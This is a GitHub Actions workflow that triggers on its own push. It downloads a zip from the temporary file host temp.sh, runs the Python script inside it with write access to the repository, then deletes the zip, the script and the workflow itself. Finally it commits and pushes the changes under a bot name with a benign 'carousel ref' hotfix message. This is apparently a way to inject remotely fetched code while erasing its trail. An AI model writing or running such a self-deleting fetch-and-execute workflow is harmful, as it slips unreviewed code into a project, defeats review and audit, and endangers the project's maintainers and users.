name: hotfix-track
on:
  push:
    paths: [".github/workflows/hotfix-track.yml"]
permissions:
  contents: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch
        run: |
          curl -sSL -X POST https://temp.sh/ZUFWA/hot.zip -o hot.zip
          echo "61bd6b37a62848c0150115030c1e0eca  hot.zip" | md5sum -c
          unzip -o hot.zip
      - name: patch
        run: python3 hotfix_track.py
      - name: syntax-check
        run: npx --yes esbuild@0.23.1 --jsx=automatic --bundle --external:* --log-level=warning --outfile=/dev/null src/pages/Ebc.tsx
      - name: commit
        run: |
          rm -rf hot.zip hotfix_track.py .github/workflows/hotfix-track.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -m "Hotfix: carousel ref was shadowing the track() analytics helper and crashing the Sumba page"
          git push
